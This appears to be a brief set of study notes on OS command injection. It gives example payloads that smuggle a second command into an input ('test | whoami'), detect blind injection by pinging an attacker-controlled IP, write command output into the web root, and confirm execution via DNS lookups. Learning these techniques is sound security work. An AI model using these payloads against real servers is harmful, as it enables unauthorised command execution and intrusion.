if the server is using some os command based execution to pull data, those input can be piped or & to add attacker commands to get command injection

test | whoami

blind injection can found by pinging the attacker server

ping -c 2 <ip>

or the output can redirected to file that is readble from the weserver 

whoami > /var/www/html/index.txt

you can use dns lookup to see if the server is execuiting your command
